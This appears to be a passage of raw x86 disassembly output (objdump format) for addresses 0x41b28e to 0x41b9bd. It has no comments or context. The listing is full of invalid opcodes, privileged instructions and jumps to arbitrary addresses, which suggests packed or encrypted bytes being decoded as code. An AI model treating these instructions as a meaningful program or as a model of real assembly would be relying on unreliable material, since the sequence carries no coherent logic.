  41b28e:	cs inc edi
  41b290:	jp     0x41b24e
  41b292:	xchg   esi,ebx
  41b294:	inc    ebp
  41b295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b296:	add    eax,DWORD PTR [ebx]
  41b298:	(bad)  
  41b299:	call   ecx
  41b29b:	out    0x6e,eax
  41b29d:	test   cl,ah
  41b29f:	ins    BYTE PTR es:[edi],dx
  41b2a0:	jmp    0xf426c7fb
  41b2a5:	int    0x34
  41b2a7:	jle    0x41b241
  41b2a9:	dec    esi
  41b2aa:	jge    0x41b286
  41b2ac:	dec    esp
  41b2ad:	xor    DWORD PTR [eax+0xfd25218],edi
  41b2b3:	aad    0x3b
  41b2b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2b6:	push   ecx
  41b2b7:	out    0xed,al
  41b2b9:	fs pop ecx
  41b2bb:	jb     0x41b32f
  41b2bd:	sub    DWORD PTR [esi+ecx*1],esi
  41b2c0:	or     eax,0x591f6035
  41b2c5:	jl     0x41b2c1
  41b2c7:	cli    
  41b2c8:	sub    edi,DWORD PTR ds:0xc8962d66
  41b2ce:	lds    ecx,FWORD PTR [ebp-0x3fcd0437]
  41b2d4:	ja     0x41b30a
  41b2d6:	inc    edi
  41b2d7:	je     0x41b2d8
  41b2d9:	xor    BYTE PTR [edi+ecx*4],al
  41b2dc:	out    0xfb,eax
  41b2de:	cli    
  41b2df:	ins    DWORD PTR es:[edi],dx
  41b2e0:	lods   al,BYTE PTR ds:[esi]
  41b2e1:	out    0x63,al
  41b2e3:	cmp    eax,0x88b91ff8
  41b2e8:	lods   eax,DWORD PTR ds:[esi]
  41b2e9:	scas   eax,DWORD PTR es:[edi]
  41b2ea:	cmp    BYTE PTR [esp+ebx*4],dh
  41b2ed:	popf   
  41b2ee:	popf   
  41b2ef:	sti    
  41b2f0:	sub    eax,0x290d7231
  41b2f5:	add    eax,0x775b4bc1
  41b2fa:	cmc    
  41b2fb:	xchg   dl,ch
  41b2fd:	js     0x41b291
  41b2ff:	retf   0x3122
  41b302:	ins    DWORD PTR es:[edi],dx
  41b303:	jle    0x41b29e
  41b305:	outs   dx,BYTE PTR ds:[esi]
  41b306:	test   eax,0xd4f81896
  41b30b:	outs   dx,DWORD PTR ds:[esi]
  41b30c:	stos   BYTE PTR es:[edi],al
  41b30d:	fstp   DWORD PTR [edx-0x5ff6c77e]
  41b313:	mov    al,0x31
  41b315:	daa    
  41b316:	jbe    0x41b2f3
  41b318:	retf   
  41b319:	mov    ebx,0x7663fe81
  41b31e:	shl    BYTE PTR [ebp+0x7174c676],cl
  41b324:	scas   eax,DWORD PTR es:[edi]
  41b325:	xor    edx,DWORD PTR [esi+eax*1+0x61]
  41b329:	or     ecx,ecx
  41b32b:	pop    ebp
  41b32c:	jecxz  0x41b31a
  41b32e:	call   0x589bb396
  41b333:	cli    
  41b334:	test   al,0x51
  41b336:	and    DWORD PTR [edx],edx
  41b338:	es int3 
  41b33a:	cld    
  41b33b:	cmc    
  41b33c:	jae    0x41b310
  41b33e:	rol    DWORD PTR [esi-0x22d9638f],1
  41b344:	or     ch,dh
  41b346:	in     eax,0x47
  41b348:	adc    BYTE PTR [edi],cl
  41b34a:	and    eax,0x8d20689c
  41b34f:	sub    esi,DWORD PTR [edi+edx*2-0x495565c8]
  41b356:	ret    
  41b357:	push   esi
  41b358:	xor    al,0x9a
  41b35a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b35b:	fdivr  DWORD PTR [ebp-0x2c]
  41b35e:	mov    bh,0x14
  41b360:	(bad)  
  41b361:	sub    eax,DWORD PTR [eax]
  41b363:	ins    BYTE PTR es:[edi],dx
  41b364:	fsubr  QWORD PTR [eax-0x64]
  41b367:	cmp    eax,0xa912857d
  41b36c:	ja     0x41b2ff
  41b36e:	nop
  41b36f:	xchg   BYTE PTR ds:0x47e1fe87,cl
  41b375:	ret    
  41b376:	iret   
  41b377:	mov    dh,0x46
  41b379:	push   edx
  41b37a:	mov    edi,0xae391be0
  41b37f:	add    dh,ah
  41b381:	xor    dl,dl
  41b383:	push   ecx
  41b384:	lock inc ebx
  41b386:	enter  0x926b,0x9e
  41b38a:	jbe    0x41b384
  41b38c:	inc    ebx
  41b38d:	cdq    
  41b38e:	sub    al,0xd6
  41b390:	stos   BYTE PTR es:[edi],al
  41b391:	add    eax,0x5175c53
  41b396:	xchg   BYTE PTR [eax+0x3f6d542c],dl
  41b39c:	clc    
  41b39d:	add    BYTE PTR [esi+0x45],al
  41b3a0:	dec    eax
  41b3a1:	dec    ebp
  41b3a2:	lods   al,BYTE PTR ds:[esi]
  41b3a3:	mov    esi,0x7571558d
  41b3a8:	and    ah,ah
  41b3aa:	inc    ebp
  41b3ab:	lock and ch,BYTE PTR [edi]
  41b3ae:	mov    ebp,0xdcfa02b4
  41b3b3:	neg    BYTE PTR [esi+0x27]
  41b3b6:	ret    0x8bb6
  41b3b9:	sub    ebx,DWORD PTR [eax]
  41b3bb:	aaa    
  41b3bc:	in     eax,0x1f
  41b3be:	or     eax,0x81375028
  41b3c3:	pop    esp
  41b3c4:	mov    ds:0x309c56ba,al
  41b3c9:	shr    dl,cl
  41b3cb:	push   0x9e74dd8c
  41b3d0:	lods   eax,DWORD PTR ds:[esi]
  41b3d1:	mov    ah,0xa8
  41b3d3:	sbb    BYTE PTR [edx-0x2e],0x2d
  41b3d7:	lock dec edi
  41b3d9:	jns    0x41b37e
  41b3db:	mov    bl,0xc1
  41b3dd:	outs   dx,BYTE PTR ds:[esi]
  41b3de:	xor    bh,0xf4
  41b3e1:	scas   al,BYTE PTR es:[edi]
  41b3e2:	or     dh,BYTE PTR [edx-0x5d]
  41b3e5:	mov    ds:0xfb4e8085,al
  41b3ea:	in     eax,0x28
  41b3ec:	and    ecx,ebx
  41b3ee:	imul   ebx,DWORD PTR [ebx+0x17],0xffffffad
  41b3f2:	mov    dh,0xc3
  41b3f4:	int3   
  41b3f5:	ret    0xcb84
  41b3f8:	aas    
  41b3f9:	(bad)  
  41b3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3fc:	(bad)  
  41b3fd:	push   edi
  41b3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ff:	cli    
  41b400:	push   ebp
  41b401:	jle    0x41b452
  41b403:	test   edx,esi
  41b405:	cmc    
  41b406:	mov    edx,0x46dd3f62
  41b40b:	push   0x49
  41b40d:	lods   eax,DWORD PTR ds:[esi]
  41b40e:	xor    ch,BYTE PTR [esi]
  41b410:	ss or  ebp,esi
  41b413:	dec    edi
  41b414:	pop    esi
  41b415:	lods   eax,DWORD PTR ds:[esi]
  41b416:	stos   DWORD PTR es:[edi],eax
  41b417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b418:	jmp    0x41b47c
  41b41a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b41b:	(bad)  
  41b41c:	adc    edx,esi
  41b41e:	push   eax
  41b41f:	cs push eax
  41b421:	mov    al,0xd5
  41b423:	ds xchg ebp,eax
  41b425:	retf   0x59fb
  41b428:	dec    eax
  41b429:	inc    DWORD PTR [esi-0x8]
  41b42c:	scas   al,BYTE PTR es:[edi]
  41b42d:	aad    0x29
  41b42f:	push   ecx
  41b430:	sub    BYTE PTR ds:0x3c7d20b5,dl
  41b436:	fxch   st(1)
  41b438:	xor    eax,0x5202d8db
  41b43d:	or     al,0x5a
  41b43f:	nop
  41b440:	mov    DWORD PTR [ebx],esi
  41b442:	js     0x41b434
  41b444:	cdq    
  41b445:	neg    DWORD PTR [eax*8-0x71a3d352]
  41b44c:	pcmpgtb mm6,QWORD PTR [ebx]
  41b44f:	pop    ds
  41b450:	adc    bh,BYTE PTR [eax]
  41b452:	sbb    dh,ch
  41b454:	test   ch,bh
  41b456:	jns    0x41b3d8
  41b458:	jecxz  0x41b45d
  41b45a:	retf   
  41b45b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b45c:	rol    DWORD PTR [edx],cl
  41b45e:	or     eax,0x6d57ea18
  41b463:	std    
  41b464:	loop   0x41b432
  41b466:	stos   DWORD PTR es:[edi],eax
  41b467:	pop    ecx
  41b468:	sub    eax,0x9a48092c
  41b46d:	xchg   edi,eax
  41b46e:	ror    DWORD PTR [eax+edx*8+0x9],0xd6
  41b473:	mov    BYTE PTR [eax],ch
  41b475:	imul   ecx,DWORD PTR [edi],0xe91c5f55
  41b47b:	push   esp
  41b47c:	push   0x48efc5de
  41b481:	popf   
  41b482:	push   ebp
  41b483:	jle    0x41b46f
  41b485:	outs   dx,DWORD PTR ds:[esi]
  41b486:	les    ebp,FWORD PTR [ebp-0x2]
  41b489:	xlat   BYTE PTR ds:[ebx]
  41b48a:	fidiv  WORD PTR [esi+0x3]
  41b48d:	ds mov bh,bl
  41b490:	and    DWORD PTR [ecx-0x647f19fd],ecx
  41b496:	sbb    dl,BYTE PTR [edi]
  41b498:	jl     0x41b47d
  41b49a:	pop    es
  41b49b:	(bad)  
  41b49c:	shl    BYTE PTR [edx+0x537e6f10],1
  41b4a2:	jno    0x41b466
  41b4a4:	mov    al,ds:0xbbc2c1ee
  41b4a9:	scas   al,BYTE PTR es:[edi]
  41b4aa:	or     al,0x77
  41b4ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ad:	jns    0x41b432
  41b4af:	or     al,0x8c
  41b4b1:	sbb    BYTE PTR [edi-0x36],cl
  41b4b4:	add    DWORD PTR [edx+ecx*1+0x48],edi
  41b4b8:	hlt    
  41b4b9:	in     eax,0x1d
  41b4bb:	jns    0x41b4a8
  41b4bd:	jp     0x41b4f1
  41b4bf:	shl    BYTE PTR fs:[ebx+0x6b04649a],cl
  41b4c6:	xchg   edi,eax
  41b4c7:	push   ds
  41b4c8:	add    esp,edx
  41b4ca:	(bad)  
  41b4cb:	(bad)  
  41b4cd:	sub    eax,0xe6d9d068
  41b4d2:	inc    ebx
  41b4d3:	xchg   esi,eax
  41b4d4:	inc    eax
  41b4d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d6:	xchg   edx,eax
  41b4d7:	ins    DWORD PTR es:[edi],dx
  41b4d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d9:	add    BYTE PTR [ecx],dh
  41b4db:	dec    esp
  41b4dc:	mov    bl,0x69
  41b4de:	repz in al,0xb5
  41b4e1:	js     0x41b4ba
  41b4e3:	ins    BYTE PTR es:[edi],dx
  41b4e4:	scas   al,BYTE PTR es:[edi]
  41b4e5:	jge    0x41b523
  41b4e7:	add    dl,dh
  41b4e9:	bound  esp,QWORD PTR [edi+edi*4]
  41b4ec:	hlt    
  41b4ed:	and    DWORD PTR [ebp-0x73be6245],eax
  41b4f3:	push   0xc0543174
  41b4f8:	pop    ebx
  41b4f9:	xchg   ebp,eax
  41b4fa:	lahf   
  41b4fb:	xchg   ebx,eax
  41b4fc:	jp     0x41b519
  41b4fe:	loop   0x41b570
  41b500:	in     al,0x14
  41b502:	aaa    
  41b503:	mov    edx,0x78590a9e
  41b508:	dec    esi
  41b509:	sub    ecx,ebp
  41b50b:	lea    eax,[edx+0x15ad268]
  41b511:	cmp    al,0x48
  41b513:	adc    DWORD PTR [ecx+0x19],edi
  41b516:	shl    BYTE PTR [ecx-0x1ed96039],1
  41b51c:	mov    ch,0xdc
  41b51e:	js     0x41b578
  41b520:	jns    0x41b4b3
  41b522:	dec    edi
  41b523:	cmp    eax,0xc5bea17a
  41b528:	retf   0x353f
  41b52b:	pop    ds
  41b52c:	mov    esi,0x246e2485
  41b531:	pop    edi
  41b532:	rol    bh,0xa1
  41b535:	clc    
  41b536:	fdivr  DWORD PTR [edi-0x3eed6c08]
  41b53c:	stos   BYTE PTR es:[edi],al
  41b53d:	dec    edi
  41b53e:	loopne 0x41b588
  41b540:	or     ebp,DWORD PTR [edx]
  41b542:	dec    ebp
  41b543:	cld    
  41b544:	jg     0x41b5c4
  41b546:	dec    ebx
  41b547:	popa   
  41b548:	loope  0x41b5ad
  41b54a:	bound  eax,QWORD PTR [edi]
  41b54c:	invd   
  41b54e:	sub    dh,BYTE PTR [ebx]
  41b550:	pop    esi
  41b551:	and    al,0x2a
  41b553:	and    BYTE PTR [eax+ecx*4],ah
  41b556:	push   ebp
  41b557:	loope  0x41b503
  41b559:	test   eax,0xc5187485
  41b55e:	mov    ds:0x92461580,eax
  41b563:	lds    esi,FWORD PTR [eax-0x2c7f77a8]
  41b569:	aad    0x6
  41b56b:	sbb    BYTE PTR [edi-0x63065993],al
  41b571:	leave  
  41b572:	inc    edi
  41b573:	mov    esi,0x530e684b
  41b578:	sbb    al,0x9c
  41b57a:	inc    edx
  41b57b:	fiadd  WORD PTR [edx+0x4ce3f4bf]
  41b581:	nop
  41b582:	xchg   esi,eax
  41b583:	enter  0x11c2,0x36
  41b587:	into   
  41b588:	and    BYTE PTR [edi-0x48],0x7a
  41b58c:	popf   
  41b58d:	mov    eax,ds:0xb2c7a1b4
  41b592:	data16 cli 
  41b594:	sub    DWORD PTR [edi-0x39b732c3],0x776dd7ef
  41b59e:	pusha  
  41b59f:	adc    al,0x5b
  41b5a1:	rcr    edx,cl
  41b5a3:	aam    0xa6
  41b5a5:	fcom   QWORD PTR [ebx]
  41b5a7:	out    dx,al
  41b5a8:	cmp    ah,dl
  41b5aa:	cdq    
  41b5ab:	mov    ebx,DWORD PTR [edx+0x2ad94113]
  41b5b1:	pushf  
  41b5b2:	stos   DWORD PTR es:[edi],eax
  41b5b3:	scas   al,BYTE PTR es:[edi]
  41b5b4:	ja     0x41b617
  41b5b6:	or     DWORD PTR [esi],edi
  41b5b8:	sbb    eax,0x86907b16
  41b5bd:	push   es
  41b5be:	add    ebp,DWORD PTR [ecx]
  41b5c0:	out    dx,eax
  41b5c1:	jb     0x41b57a
  41b5c3:	enter  0xa2d0,0x35
  41b5c7:	sbb    al,0x6b
  41b5c9:	mov    dh,0xa7
  41b5cc:	aas    
  41b5cd:	sahf   
  41b5ce:	xchg   ecx,eax
  41b5cf:	xlat   BYTE PTR ds:[ebx]
  41b5d0:	or     DWORD PTR [edx+0xace8f64],esi
  41b5d6:	mov    ebx,ecx
  41b5d8:	pop    DWORD PTR [esi]
  41b5da:	cmp    BYTE PTR [edx],bh
  41b5dc:	add    DWORD PTR ds:0x24b48b87,esp
  41b5e2:	sub    esp,DWORD PTR [edi+0x25a63cac]
  41b5e8:	test   DWORD PTR [ebx],0xb8716029
  41b5ee:	mov    DWORD PTR [ebx-0x61],ecx
  41b5f1:	pushf  
  41b5f2:	dec    edi
  41b5f3:	dec    eax
  41b5f4:	sbb    eax,0x594ce17c
  41b5f9:	xchg   esi,eax
  41b5fa:	pop    es
  41b5fb:	mov    ecx,0x25bdb6d3
  41b600:	add    DWORD PTR [eax+0x7],ebx
  41b603:	popa   
  41b604:	mov    BYTE PTR [ecx-0x300b6eb2],dl
  41b60a:	stos   DWORD PTR es:[edi],eax
  41b60b:	lea    esp,[eax]
  41b60d:	cld    
  41b60e:	xlat   BYTE PTR ds:[ebx]
  41b60f:	sbb    eax,DWORD PTR [ecx+0x5]
  41b612:	(bad)  
  41b613:	pop    esi
  41b614:	pop    esi
  41b615:	mov    ecx,0x9e0cf733
  41b61a:	lods   eax,DWORD PTR ds:[esi]
  41b61b:	pop    edi
  41b61c:	jb     0x41b68c
  41b61e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b61f:	(bad)  
  41b620:	mov    ecx,0x8e268e6
  41b625:	hlt    
  41b626:	jbe    0x41b674
  41b628:	push   ecx
  41b629:	test   eax,0xbf88ca96
  41b62e:	outs   dx,DWORD PTR ds:[esi]
  41b62f:	lds    esp,FWORD PTR [edi+esi*8-0x665c4157]
  41b636:	(bad)  
  41b637:	xor    DWORD PTR [ebx-0x2b447183],edx
  41b63d:	lock sti 
  41b63f:	jge    0x41b685
  41b641:	out    0xec,eax
  41b643:	(bad)  
  41b644:	sbb    eax,0x6d5dcdc9
  41b649:	icebp  
  41b64a:	stos   BYTE PTR es:[edi],al
  41b64b:	nop
  41b64c:	push   ds
  41b64d:	cs dec esp
  41b64f:	sar    BYTE PTR [edx+ebp*1],1
  41b652:	fs mov eax,eax
  41b655:	fisubr WORD PTR [edx-0x19660433]
  41b65b:	ss pop eax
  41b65d:	lods   eax,DWORD PTR ds:[esi]
  41b65e:	mov    edx,0xa9e34b4e
  41b663:	push   edx
  41b664:	mov    ebp,0x1652d0c1
  41b669:	pop    edi
  41b66a:	lods   eax,DWORD PTR ds:[esi]
  41b66b:	fucom  st(2)
  41b66d:	ficom  DWORD PTR [edi+0x6971ead7]
  41b673:	(bad)  
  41b675:	das    
  41b676:	mov    al,ds:0xfc31888a
  41b67b:	lahf   
  41b67c:	xor    ebp,DWORD PTR [esi-0x4c]
  41b67f:	push   eax
  41b680:	add    eax,0x91076fd0
  41b685:	fs iret 
  41b687:	or     ebp,esi
  41b689:	sbb    edi,edx
  41b68b:	jmp    0x41b6bf
  41b68d:	gs das 
  41b68f:	sub    ch,BYTE PTR [ebx]
  41b691:	add    esi,DWORD PTR [esi+0x48]
  41b694:	sti    
  41b695:	jno    0x41b704
  41b697:	mov    edi,0x1ee77fc3
  41b69c:	mov    eax,DWORD PTR [ebx-0x2c]
  41b69f:	cmp    al,0x7
  41b6a1:	mov    BYTE PTR [eax-0x60bcab74],ch
  41b6a7:	je     0x41b698
  41b6a9:	out    0x58,eax
  41b6ab:	test   BYTE PTR fs:[ebx],dl
  41b6ae:	das    
  41b6af:	repnz int3 
  41b6b1:	rcl    DWORD PTR [ebp+0x24e01c77],cl
  41b6b7:	bound  edi,QWORD PTR [ecx-0x5a]
  41b6ba:	cdq    
  41b6bb:	adc    al,0x57
  41b6bd:	cmp    ecx,ebp
  41b6bf:	xchg   ebx,eax
  41b6c0:	sti    
  41b6c1:	es pop edx
  41b6c3:	mov    dh,0x4e
  41b6c5:	and    BYTE PTR [edi+0x333e6add],ah
  41b6cb:	push   ecx
  41b6cc:	dec    eax
  41b6cd:	add    DWORD PTR [esi],0x1d7068d0
  41b6d3:	(bad)  
  41b6d4:	je     0x41b70b
  41b6d6:	daa    
  41b6d7:	adc    al,0xdd
  41b6d9:	mov    bh,0xf9
  41b6db:	fld    TBYTE PTR [esi]
  41b6dd:	sub    bh,dl
  41b6df:	jne    0x41b759
  41b6e1:	xchg   esp,edx
  41b6e3:	outs   dx,BYTE PTR ds:[esi]
  41b6e4:	leave  
  41b6e5:	cmc    
  41b6e6:	outs   dx,DWORD PTR ds:[esi]
  41b6e7:	add    esi,DWORD PTR [ebp-0x29f87a9d]
  41b6ed:	rcr    DWORD PTR [ebp+0x122eb360],1
  41b6f3:	push   cs
  41b6f4:	popf   
  41b6f5:	mov    esp,gs
  41b6f7:	fadd   QWORD PTR [ebx-0x40c75562]
  41b6fd:	(bad)  
  41b6ff:	fsubr  DWORD PTR [edx+0x5af66dd9]
  41b705:	mov    WORD PTR [ecx],cs
  41b707:	and    BYTE PTR [ecx+0x47],dh
  41b70a:	cmc    
  41b70b:	nop
  41b70c:	mov    ch,0xee
  41b70e:	lahf   
  41b70f:	cmp    DWORD PTR [ecx],0x62
  41b712:	jae    0x41b73f
  41b714:	stc    
  41b715:	cmp    dh,BYTE PTR [edi-0x3e5b5a38]
  41b71b:	sar    DWORD PTR [ecx+0x13],cl
  41b71e:	adc    ebx,ebp
  41b720:	mov    BYTE PTR [ebp+ebp*4+0x500eab3],cl
  41b727:	adc    BYTE PTR [ebx+esi*4],0x9a
  41b72b:	(bad)  
  41b72c:	mov    eax,0x40969087
  41b731:	cmp    eax,0xe288304a
  41b736:	adc    edx,DWORD PTR [eax]
  41b738:	hlt    
  41b739:	fxch   st(4)
  41b73b:	adc    eax,0x73c6edf7
  41b740:	jp     0x41b706
  41b742:	sahf   
  41b743:	mov    edx,0x5d09f3c4
  41b748:	xchg   esp,eax
  41b749:	mov    esi,0x66d7793
  41b74e:	pop    esp
  41b74f:	sbb    DWORD PTR [ebp-0x70],ecx
  41b752:	or     eax,DWORD PTR ds:0x261292f3
  41b758:	or     edi,eax
  41b75a:	pusha  
  41b75b:	cs mov ebp,0x2c402d81
  41b761:	sub    cl,0xdf
  41b764:	call   0x3e60:0x3ff14631
  41b76b:	add    eax,0x42bd43bb
  41b770:	sub    BYTE PTR [esi-0xd],dh
  41b773:	fwait
  41b774:	das    
  41b775:	mov    ?,WORD PTR [edi+0x4c]
  41b778:	push   esi
  41b779:	mov    edi,0x847c0f8a
  41b77e:	mov    dh,0x88
  41b780:	push   esi
  41b781:	sub    BYTE PTR [ecx+0x58],ch
  41b784:	into   
  41b785:	sbb    esp,DWORD PTR [esi]
  41b787:	and    al,0x5c
  41b789:	jo     0x41b7ef
  41b78b:	sub    BYTE PTR [edx-0x35],ch
  41b78e:	test   esp,0x588e061
  41b794:	ficomp WORD PTR [edx]
  41b796:	pop    esi
  41b797:	dec    esp
  41b798:	(bad)  
  41b799:	fisttp QWORD PTR [edx]
  41b79b:	(bad)  [ebp+0x2]
  41b79e:	iret   
  41b79f:	sbb    BYTE PTR [edx+ebx*1+0x38],dl
  41b7a3:	and    BYTE PTR [edi+0x4846dbcb],bl
  41b7a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7ab:	and    eax,0x7e115856
  41b7b0:	gs inc eax
  41b7b2:	les    esi,FWORD PTR [esi]
  41b7b4:	ret    
  41b7b5:	adc    BYTE PTR [ebp-0x26],al
  41b7b8:	jle    0x41b7ca
  41b7ba:	fs scas eax,DWORD PTR es:[edi]
  41b7bc:	scas   al,BYTE PTR es:[edi]
  41b7bd:	add    DWORD PTR [ecx],ebx
  41b7bf:	jno    0x41b829
  41b7c1:	scas   eax,DWORD PTR es:[edi]
  41b7c2:	inc    ecx
  41b7c3:	mov    ebp,0x3e5ded98
  41b7c8:	mov    dh,0x95
  41b7ca:	(bad)  
  41b7cb:	aam    0x2d
  41b7cd:	or     dl,BYTE PTR [edx-0x63]
  41b7d0:	(bad)  
  41b7d1:	in     eax,dx
  41b7d2:	add    BYTE PTR [edx+0x31cf1c24],0x8e
  41b7d9:	je     0x41b7e2
  41b7db:	sub    edi,ecx
  41b7dd:	repnz xor bh,0xa5
  41b7e1:	loopne 0x41b839
  41b7e3:	neg    esi
  41b7e5:	dec    edx
  41b7e6:	(bad)  
  41b7e7:	push   0xfffffff0
  41b7e9:	(bad)  
  41b7ea:	push   edx
  41b7eb:	pusha  
  41b7ec:	jecxz  0x41b779
  41b7ee:	push   ebp
  41b7ef:	add    eax,DWORD PTR [ebx+0x4a5995cc]
  41b7f5:	pop    ebx
  41b7f6:	mov    dh,0x69
  41b7f8:	push   0xffffffb2
  41b7fa:	aad    0x63
  41b7fc:	and    al,0xb6
  41b7fe:	ins    DWORD PTR es:[edi],dx
  41b7ff:	das    
  41b800:	ficom  DWORD PTR [edx]
  41b802:	lods   eax,DWORD PTR ds:[esi]
  41b803:	pminub mm3,QWORD PTR [edi+0x8]
  41b807:	aas    
  41b808:	enter  0x42e6,0x1
  41b80c:	push   0x8124661d
  41b811:	fucomp st(4)
  41b813:	dec    edi
  41b814:	inc    ebp
  41b815:	out    dx,eax
  41b816:	test   eax,0xe138dfe3
  41b81b:	test   DWORD PTR [ebx],0x7b820bbc
  41b821:	mov    dh,0xfe
  41b823:	lock mov ds:0xf79466a1,eax
  41b829:	or     DWORD PTR [edi],ecx
  41b82b:	aam    0xd6
  41b82d:	jne    0x41b7b0
  41b82f:	mov    ds:0xb2163cd0,al
  41b834:	es ja  0x41b80a
  41b837:	mov    dh,0x75
  41b839:	test   BYTE PTR [edx+0x53],al
  41b83c:	mov    bl,0xf3
  41b83e:	inc    ecx
  41b83f:	jge    0x41b7fd
  41b841:	cmp    DWORD PTR [eax+edi*4+0x450c5d61],esp
  41b848:	jmp    0x41b7d9
  41b84a:	jnp    0x41b8c2
  41b84c:	cmp    BYTE PTR [eax],ah
  41b84e:	sbb    BYTE PTR [esi],dh
  41b850:	cli    
  41b851:	mov    esp,0x99d7260c
  41b856:	icebp  
  41b857:	out    dx,al
  41b858:	push   ebp
  41b859:	into   
  41b85a:	sub    esi,esi
  41b85c:	daa    
  41b85d:	mov    eax,0xd3717bf0
  41b862:	lahf   
  41b863:	mov    ds:0x4c183736,eax
  41b868:	popa   
  41b869:	fsub   QWORD PTR [ecx]
  41b86b:	imul   esp,DWORD PTR [ebx+0x20],0xffffffcb
  41b86f:	add    bh,bh
  41b871:	retf   0x762
  41b874:	jecxz  0x41b851
  41b876:	jno    0x41b828
  41b878:	dec    esi
  41b879:	push   edi
  41b87a:	push   ebx
  41b87b:	mov    dh,0x2b
  41b87d:	push   edi
  41b87e:	(bad)  
  41b87f:	jmp    0xd7e00431
  41b884:	lahf   
  41b885:	push   esp
  41b886:	jo     0x41b831
  41b888:	inc    ebx
  41b889:	add    DWORD PTR [ebx-0x2d77384c],esp
  41b88f:	retf   
  41b890:	dec    ebp
  41b891:	sbb    DWORD PTR [ebp-0x63],esp
  41b894:	stc    
  41b895:	cmp    al,0x80
  41b897:	in     eax,dx
  41b898:	push   esp
  41b899:	adc    BYTE PTR [edi],al
  41b89b:	and    eax,0x2c4c0993
  41b8a0:	xchg   ebp,eax
  41b8a1:	pop    esp
  41b8a2:	(bad)  
  41b8a3:	jae    0x41b8b6
  41b8a5:	mov    edi,0xdab90aa4
  41b8aa:	in     eax,dx
  41b8ab:	jle    0x41b87d
  41b8ad:	pop    ds
  41b8ae:	mov    WORD PTR [ebp+0x40424f36],?
  41b8b4:	les    edx,FWORD PTR [ebx]
  41b8b6:	mov    dh,0x76
  41b8b8:	xchg   esp,eax
  41b8b9:	in     eax,dx
  41b8ba:	push   es
  41b8bb:	dec    cx
  41b8bd:	ins    BYTE PTR es:[edi],dx
  41b8be:	cmc    
  41b8bf:	xlat   BYTE PTR ds:[ebx]
  41b8c0:	test   eax,0xaf766810
  41b8c5:	call   0x5f27:0x95aa298d
  41b8cc:	ds jmp 0x65c75d96
  41b8d2:	and    edi,esi
  41b8d4:	jns    0x41b8cd
  41b8d6:	cdq    
  41b8d7:	jns    0x41b931
  41b8d9:	mov    ah,BYTE PTR [edi-0x2ebe7c6c]
  41b8df:	inc    edi
  41b8e0:	push   edx
  41b8e1:	xchg   esi,eax
  41b8e2:	push   0x9f6b97b8
  41b8e7:	std    
  41b8e8:	push   edx
  41b8e9:	or     dh,BYTE PTR [edi-0x37]
  41b8ec:	adc    eax,0xd4303796
  41b8f1:	inc    esi
  41b8f2:	add    DWORD PTR [esi-0xb1bbb70],ebx
  41b8f8:	xchg   edx,eax
  41b8f9:	cli    
  41b8fa:	cld    
  41b8fb:	out    dx,eax
  41b8fc:	loope  0x41b979
  41b8fe:	push   esp
  41b8ff:	iret   
  41b900:	inc    edi
  41b901:	sar    eax,1
  41b903:	inc    esi
  41b904:	sub    bh,BYTE PTR [ecx-0x453dd003]
  41b90a:	ror    dh,1
  41b90c:	xor    ebx,DWORD PTR [ecx]
  41b90e:	add    ch,BYTE PTR [esi]
  41b910:	es push esi
  41b912:	pop    ebp
  41b913:	mov    eax,0x58537107
  41b918:	add    bl,ah
  41b91a:	jns    0x41b903
  41b91c:	(bad)  
  41b91d:	lods   al,BYTE PTR ds:[esi]
  41b91e:	sub    al,0x48
  41b920:	pop    ds
  41b921:	call   0xb2698d2a
  41b926:	inc    edi
  41b927:	add    eax,0xae77c628
  41b92c:	cli    
  41b92d:	sahf   
  41b92e:	adc    eax,0x1e
  41b931:	in     al,0xe1
  41b933:	mov    eax,0xa9cd2f1b
  41b938:	mov    edi,0x79589657
  41b93d:	mov    WORD PTR [edi+0x7889d326],cs
  41b943:	aad    0x6a
  41b945:	xor    esp,eax
  41b947:	into   
  41b948:	sbb    eax,0xa7c9332b
  41b94d:	fld    QWORD PTR [ecx+ebp*2+0xf]
  41b951:	cmp    BYTE PTR [eax],bh
  41b953:	daa    
  41b954:	dec    esp
  41b955:	daa    
  41b956:	mov    al,fs:0x6416d8a8
  41b95c:	xor    eax,0xbe2dab6b
  41b961:	and    bl,cl
  41b963:	jae    0x41b9b5
  41b965:	dec    edx
  41b966:	xchg   DWORD PTR [ecx+0x71],esp
  41b969:	(bad)  
  41b96b:	pop    esi
  41b96c:	out    dx,eax
  41b96d:	jns    0x41b95c
  41b96f:	cmp    ah,dh
  41b971:	lea    eax,[edx+ecx*8+0x4b1efad8]
  41b978:	mov    gs,WORD PTR [edi]
  41b97a:	jnp    0x41b972
  41b97c:	jg     0x41b8ff
  41b97e:	pop    esi
  41b97f:	ror    edx,cl
  41b981:	hlt    
  41b982:	call   0x824b:0x59db9061
  41b989:	sti    
  41b98a:	cmc    
  41b98b:	push   0xffffff97
  41b98d:	jns    0x41b93a
  41b98f:	xchg   edi,eax
  41b990:	and    DWORD PTR [ebx],ebp
  41b992:	cs mov ecx,0x78adbc
  41b998:	mov    cl,BYTE PTR ds:0xb57c9aa1
  41b99e:	repnz (bad) 
  41b9a0:	mov    ds:0xab864495,al
  41b9a5:	push   ebx
  41b9a6:	lock xchg esi,eax
  41b9a8:	mov    dh,0x7c
  41b9aa:	sub    cl,ah
  41b9ac:	cwde   
  41b9ad:	adc    DWORD PTR [eax+0x6f],edi
  41b9b0:	(bad)  
  41b9b1:	in     al,dx
  41b9b2:	mov    bl,0xa
  41b9b4:	dec    esp
  41b9b5:	ds jge 0x41b9c4
  41b9b8:	add    bl,0xef
  41b9bb:	xor    ah,BYTE PTR [eax]
  41b9bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
